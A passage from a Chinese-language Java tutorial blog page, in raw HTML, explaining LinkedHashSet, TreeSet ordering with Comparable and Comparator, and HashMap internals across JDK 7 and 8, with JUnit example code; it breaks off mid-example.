href="#LinkedSet" class="headerlink" title="LinkedSet"></a>LinkedSet</h2><ul><li><p>LinkedHashSet 是 HashSet 的子类</p></li><li><p>LinkedHashSet 根据元素的 hashCode 值来决定元素的存储位置，但它同时<strong>使用双向链表维护元素的次序</strong>，这使得元素看起来是以插入顺序保存的。</p></li><li><p>LinkedHashSet <strong>插入性能略低于 HashSet，但在迭代访问 Set 里的全部元素时有很好的性能</strong>。</p></li><li><p>LinkedHashSet 不允许集合元素重复。</p></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200918093749.png"></p><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><ul><li><p>TreeSet 是 SortedSet 接口的实现类，TreeSet 可以确保集合元素处于排序状态。</p></li><li><p>TreeSet底层使用<strong>红黑树</strong>结构存储数据</p></li><li><p>新增的方法如下： (了解) </p><ul><li><p>Comparator comparator()</p></li><li><p>Object first()</p></li><li><p>Object last()</p></li><li><p>Object lower(Object e)</p></li><li><p>Object higher(Object e)</p></li><li><p>SortedSet subSet(fromElement, toElement) </p></li><li><p>SortedSet headSet(toElement) </p></li><li><p>SortedSet tailSet(fromElement)</p></li></ul></li><li><p>TreeSet 两种排序方法：<strong>自然排序</strong>和<strong>定制排序</strong>。默认情况下，TreeSet 采用自然排序。</p></li></ul><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200918151627.png"></p><hr><p><strong>自然排序：</strong>TreeSet 会调用集合元素的 <strong>compareTo(Object obj)</strong> 方法来比较元素之间的大小关系，然后将集合元素按升序(默认情况)排列。</p><p>如果试图把一个对象添加到 TreeSet 时，则该对象的类 <strong>必须实现 Comparable 接口</strong>。</p><p>实现 Comparable 的类必须实现 compareTo(Object obj) 方法，两个对象即通过compareTo(Object obj) 方法的返回值来比较大小。 </p><p>Comparable 的典型实现：</p><ul><li><p>BigDecimal、BigInteger 以及所有的数值型对应的包装类：按它们对应的数值大小进行比较</p></li><li><p>Character：按字符的 unicode 值来进行比较</p></li><li><p>Boolean：true 对应的包装类实例大于 false 对应的包装类实例</p></li><li><p>String：按字符串中字符的 unicode 值进行比较</p></li><li><p>Date、Time：后边的时间、日期比前面的时间、日期大</p></li></ul><p><strong>注意事项：</strong></p><blockquote><ol><li>向 TreeSet 中添加元素时，只有第一个元素无须比较compareTo()方法，后面添加的所有元素都会调用compareTo()方法进行比较。</li><li><strong>因为只有相同类的两个实例才会比较大小，所以向</strong> <strong>TreeSet 中添加的应该是同一个类的对象。</strong></li><li>对于 TreeSet 集合而言，它判断两个对象是否相等的唯一标准是：两个对象通过 compareTo(Object obj) 方法比较返回值，如果相等则返回0。</li><li>当需要把一个对象放入 TreeSet 中，重写该对象对应的 equals() 方法时，应保证该方法与 compareTo(Object obj) 方法有一致的结果：如果两个对象通过equals() 方法比较返回 true，则通过 compareTo(Object obj) 方法比较应返回 0。</li></ol></blockquote><hr><p><strong>定制排序：</strong>TreeSet的自然排序要求元素所属的类实现Comparable接口，如果元素所属的类没有实现Comparable接口，或不希望按照升序(默认情况)的方式排列元素或希望按照其它属性大小进行排序，则考虑使用定制排序。定制排序，通过<strong>Comparator接口</strong>来实现。需要重写**compare(T o1,T o2)**方法。 </p><ul><li><p>利用int compare(T o1,T o2)方法，比较o1和o2的大小：如果方法返回正整数，则表示o1大于o2；如果返回0，表示相等；返回负整数，表示o1小于o2。 </p></li><li><p>要实现定制排序，需要<strong>将实现Comparator接口的实例作为形参传递给TreeSet的构造器。</strong></p></li><li><p>此时，仍然只能向TreeSet中添加类型相同的对象。否则发生ClassCastException异常。</p></li><li><p>使用定制排序判断两个元素相等的标准是：通过Comparator比较两个元素返回了0。</p></li></ul><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//按照姓名从大到小排列,年龄从小到大排列</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Person) &#123;</span><br><span class="line">            <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) o;</span><br><span class="line">            <span class="type">int</span> <span class="variable">compare</span> <span class="operator">=</span> -<span class="built_in">this</span>.name.compareTo(person.name);</span><br><span class="line">            <span class="keyword">if</span> (compare != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> compare;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> Integer.compare(<span class="built_in">this</span>.age, person.age);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;输入的类型不匹配&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeSetTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;<span class="comment">//测试自然排序</span></span><br><span class="line">        <span class="type">TreeSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeSet</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//失败：不能添加不同类的对象</span></span><br><span class="line"><span class="comment">//        set.add(123);</span></span><br><span class="line"><span class="comment">//        set.add(456);</span></span><br><span class="line"><span class="comment">//        set.add(&quot;AA&quot;);</span></span><br><span class="line"><span class="comment">//        set.add(new Person(&quot;Tom&quot;,12));</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//举例一：</span></span><br><span class="line"><span class="comment">//        set.add(34);</span></span><br><span class="line"><span class="comment">//        set.add(-34);</span></span><br><span class="line"><span class="comment">//        set.add(43);</span></span><br><span class="line"><span class="comment">//        set.add(11);</span></span><br><span class="line"><span class="comment">//        set.add(8);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//举例二：</span></span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Tom&quot;</span>, <span class="number">12</span>));</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>, <span class="number">32</span>));</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jim&quot;</span>, <span class="number">2</span>));</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Mike&quot;</span>, <span class="number">65</span>));</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jack&quot;</span>, <span class="number">33</span>));</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jack&quot;</span>, <span class="number">56</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> set.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;<span class="comment">//测试定制排序</span></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">com</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Comparator</span>() &#123;</span><br><span class="line">            <span class="comment">//按照年龄从小到大排列</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (o1 <span class="keyword">instanceof</span> Person &amp;&amp; o2 <span class="keyword">instanceof</span> Person) &#123;</span><br><span class="line">                    <span class="type">Person</span> <span class="variable">u1</span> <span class="operator">=</span> (Person) o1;</span><br><span class="line">                    <span class="type">Person</span> <span class="variable">u2</span> <span class="operator">=</span> (Person) o2;</span><br><span class="line">                    <span class="keyword">return</span> Integer.compare(u1.getAge(), u2.getAge());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;输入的数据类型不匹配&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TreeSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeSet</span>(com);</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Tom&quot;</span>, <span class="number">12</span>));</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>, <span class="number">32</span>));</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jim&quot;</span>, <span class="number">2</span>));</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Mike&quot;</span>, <span class="number">65</span>));</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Mary&quot;</span>, <span class="number">33</span>));</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jack&quot;</span>, <span class="number">33</span>));<span class="comment">//不会出现</span></span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jack&quot;</span>, <span class="number">56</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> set.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="经典面试题-1"><a href="#经典面试题-1" class="headerlink" title="经典面试题"></a>经典面试题</h2><p>在List内去除重复数字值，要求尽量简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List <span class="title function_">duplicateList</span><span class="params">(List list)</span> &#123;</span><br><span class="line"><span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">set.addAll(list);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>(set);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">list.add(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>));</span><br><span class="line">list.add(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">2</span>));</span><br><span class="line">list.add(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">2</span>));</span><br><span class="line">list.add(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">4</span>));</span><br><span class="line">list.add(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">4</span>));</span><br><span class="line"><span class="type">List</span> <span class="variable">list2</span> <span class="operator">=</span> duplicateList(list);</span><br><span class="line"><span class="keyword">for</span> (Object integer : list2) &#123;</span><br><span class="line">System.out.println(integer);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：如果list的元素是自定义的类，还需重写hashcode()和equals()</p><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LastTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;AA&quot;</span>, <span class="number">1001</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;BB&quot;</span>, <span class="number">1002</span>);</span><br><span class="line">        set.add(p1);</span><br><span class="line">        set.add(p2);</span><br><span class="line">        p1.name = <span class="string">&quot;CC&quot;</span>;</span><br><span class="line">        set.remove(p1);</span><br><span class="line">        System.out.println(set);</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;CC&quot;</span>, <span class="number">1001</span>));</span><br><span class="line">        System.out.println(set);</span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;AA&quot;</span>, <span class="number">1001</span>));</span><br><span class="line">        System.out.println(set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong><br>[Person{name&#x3D;’CC’, age&#x3D;1001}, Person{name&#x3D;’BB’, age&#x3D;1002}]<br>[Person{name&#x3D;’CC’, age&#x3D;1001}, Person{name&#x3D;’CC’, age&#x3D;1001}, Person{name&#x3D;’BB’, age&#x3D;1002}]<br>[Person{name&#x3D;’CC’, age&#x3D;1001}, Person{name&#x3D;’CC’, age&#x3D;1001}, Person{name&#x3D;’AA’, age&#x3D;1001}, Person{name&#x3D;’BB’, age&#x3D;1002}]</p><p>思路请看HashSet添加元素的过程。</p><h1 id="Map接口"><a href="#Map接口" class="headerlink" title="Map接口"></a>Map接口</h1><h2 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h2><ul><li>Map:双列数据，存储key-value对的数据   —类似于高中的函数：y &#x3D; f(x)<ul><li>HashMap:作为Map的主要实现类；线程不安全的，效率高；<strong>可以存储null的key和value。</strong><ul><li>LinkedHashMap:保证在遍历map元素时，可以按照添加的顺序实现遍历。对于频繁的遍历操作，此类执行效率高于HashMap。</li></ul></li><li>TreeMap:保证按照添加的key-value对进行排序，实现排序遍历。此时考虑key的自然排序或定制排序，底层使用红黑树</li><li>Hashtable:作为古老的实现类；线程安全的，效率低；<strong>不能存储null的key和value</strong><ul><li>Properties:常用来处理配置文件。<strong>key和value都是String类型。</strong></li></ul></li></ul></li></ul><hr><blockquote><p>key 和 value 之间存在单向一对一关系，即通过指定的 key 总能找到唯一的、确定的 value。</p><p>Map中的key:无序的、不可重复的，使用Set存储所有的key  —&gt; key所在的类要重写equals()和hashCode() （以HashMap为例）。</p><p>Map中的value:无序的、可重复的，使用Collection存储所有的value —&gt;value所在的类要重写equals()</p><p>一个键值对：key-value构成了一个Entry对象。</p><p>Map中的entry:无序的、不可重复的，使用Set存储所有的entry。</p><p>HashMap 判断两个 key 相等的标准是：两个 key 通过 equals() 方法返回 true，hashCode 值也相等。</p><p>HashMap 判断两个 value相等的标准是：两个 value 通过 equals() 方法返回 true。</p></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200918225948.png"></p><h2 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h2><p><strong>存储结构：</strong></p><p>JDK 7及以前版本：HashMap是数组+链表结构(即为链地址法)</p><p>JDK 8版本发布以后：HashMap是数组+链表+红黑树实现。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200919001026.png"><br><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200919001046.png"></p><hr><p><strong>HashMap的底层实现原理</strong></p><p>以<strong>jdk7</strong>为例说明：</p><ul><li><pre><code> HashMap map = new HashMap()；//在实例化以后，底层创建了长度是16的一维数组Entry[] table。</code></pre></li><li><pre><code> map.put(key1,value1)；</code></pre></li></ul><blockquote><ul><li>首先，调用key1所在类的hashCode()计算key1哈希值，此哈希值经过某种算法计算以后，得到在Entry数组中的存放位置。<ul><li><p>如果此位置上的数据为空，此时的key1-value1添加成功。 —-情况1</p></li><li><p>如果此位置上的数据不为空，(意味着此位置上存在一个或多个数据(以链表形式存在)),比较key1和已经存在的一个或多个数据的哈希值：</p><ul><li><p>如果key1的哈希值与已经存在的数据的哈希值都不相同，此时key1-value1添加成功。—-情况2</p></li><li><p>如果key1的哈希值和已经存在的某一个数据(key2-value2)的哈希值相同，继续比较：调用key1所在类的equals(key2)方法比较：</p><p>①如果equals()返回false：此时key1-value1添加成功。—-情况3</p><p>②如果equals()返回true：使用value1替换value2。</p></li></ul></li></ul></li></ul></blockquote><ul><li><pre><code> 补充：关于情况2和情况3：此时key1-value1和原来的数据以链表的方式存储。</code></pre></li><li><pre><code> 在不断的添加过程中，会涉及到扩容问题，当**超出临界值(且要存放的位置非空)**时扩容。默认的扩容方式：扩容为**原来容量的2倍**，并将原有的数据复制过来。</code></pre></li></ul><hr><p><strong>jdk8</strong>相较于jdk7在底层实现方面的不同：</p><ol><li><p>new HashMap()；底层没有创建一个长度为16的数组</p></li><li><p>jdk 8底层的数组是：Node[]，而非Entry[]</p></li><li><p>首次调用put()方法时，底层创建长度为16的数组</p></li><li><p>jdk7底层结构只有：数组+链表。jdk8中底层结构：数组+链表+红黑树。</p></li></ol><ul><li><p>形成链表时，七上八下</p><ul><li>jdk7：新的元素指向旧的元素，新添加的元素作为链表的head。</li><li>jdk8：旧的元素指向新的元素，新添加的元素作为链表的last，或树的叶子结点。</li></ul></li><li><p><strong>当数组的某一个索引位置上的元素以链表形式存在的数据个数 &gt; 8 且当前数组的长度 &gt; 64时，此时此索引位置上的所数据改为使用红黑树存储。</strong></p><ul><li>当HashMap中的其中一个链的对象个数如果达到了8个，此时如果capacity没有达到64，那么HashMap会先扩容解决，如果已经达到了64，那么这个链会变成树，结点类型由Node变成TreeNode类型。当然，如果当映射关系被移除后，下次resize方法时判断树的结点个数低于6个，也会把树再转为链表。</li></ul></li></ul><hr><p><strong>LinkedHashMap的底层实现原理</strong></p><p>HashMap中的内部类：Node</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry&lt;K,V&gt; &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> K key;</span><br><span class="line"></span><br><span class="line">V value;</span><br><span class="line"></span><br><span class="line">Node&lt;K,V&gt; next; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LinkedHashMap中的内部类：Entry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Entry</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">HashMap</span>.Node&lt;K,V&gt; &#123;</span><br><span class="line"></span><br><span class="line">Entry&lt;K,V&gt; before, after;</span><br><span class="line"></span><br><span class="line">Entry(<span class="type">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">super</span>(hash, key, value, next);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="源码中的重要常量"><a href="#源码中的重要常量" class="headerlink" title="源码中的重要常量"></a>源码中的重要常量</h2><ul><li><p>DEFAULT_INITIAL_CAPACITY : HashMap的默认容量，16</p></li><li><p>MAXIMUM_CAPACITY：HashMap的最大支持容量，2^30</p></li><li><p>DEFAULT_LOAD_FACTOR：HashMap的默认加载因子：0.75</p></li><li><p>threshold：扩容的临界值&#x3D;容量*填充因子：16 * 0.75 &#x3D;&gt; 12</p></li><li><p>TREEIFY_THRESHOLD：Bucket（桶）中链表长度大于该默认值，转化为红黑树：8</p></li><li><p>MIN_TREEIFY_CAPACITY：桶中的Node被树化时最小的hash表容量：64</p></li><li><p>table：存储元素的数组，总是2的n次幂</p></li><li><p>entrySet：存储具体元素的集</p></li><li><p>size：HashMap中存储的键值对的数量</p></li><li><p>modCount：HashMap扩容和结构改变的次数</p></li></ul><h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><p>负载因子值的大小，对HashMap有什么影响</p><ul><li>负载因子的大小决定了HashMap的数据密度。</li></ul><ul><li><p>负载因子越大密度越大，发生碰撞的几率越高，数组中的链表越容易长，造成查询或插入时的比较次数增多，性能会下降。</p></li><li><p>负载因子越小，就越容易触发扩容，数据密度也越小，意味着发生碰撞的几率越小，数组中的链表也就越短，查询和插入时比较的次数也越小，性能会更高。但是会浪费一定的内容空间。而且经常扩容也会影响性能，建议初始化预设大一点的空间。</p></li><li><p>按照其他语言的参考及研究经验，会考虑将负载因子设置为0.7~0.75，此时平均检索长度接近于常数。</p></li></ul><h2 id="接口方法-1"><a href="#接口方法-1" class="headerlink" title="接口方法"></a>接口方法</h2><p><strong>添加、删除、修改操作：</strong> </p><ul><li><p>Object put(Object key,Object value)：将指定key-value添加到(或修改)当前map对象中</p></li><li><p>void putAll(Map m):将m中的所有key-value对存放到当前map中 </p></li><li><p>Object remove(Object key)：移除指定key的key-value对，并返回value</p></li><li><p>void clear()：清空当前map中的所有数据</p></li></ul><p><strong>元素查询的操作：</strong></p><ul><li><p>Object get(Object key)：获取指定key对应的value</p></li><li><p>boolean containsKey(Object key)：是否包含指定的key</p></li><li><p>boolean containsValue(Object value)：是否包含指定的value</p></li><li><p>int size()：返回map中key-value对的个数</p></li><li><p>boolean isEmpty()：判断当前map是否为空</p></li><li><p>boolean equals(Object obj)：判断当前map和参数对象obj是否相等</p></li></ul><p><strong>元视图操作的方法：</strong></p><ul><li><p>Set keySet()：返回所有key构成的Set集合</p></li><li><p>Collection values()：返回所有value构成的Collection集合</p></li><li><p>Set entrySet()：返回所有key-value对构成的Set集合</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;AA&quot;</span>, <span class="number">123</span>);</span><br><span class="line">        map.put(<span class="number">45</span>, <span class="number">1234</span>);</span><br><span class="line">        map.put(<span class="string">&quot;BB&quot;</span>, <span class="number">56</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历所有的key集：keySet()</span></span><br><span class="line">        <span class="type">Set</span> <span class="variable">set</span> <span class="operator">=</span> 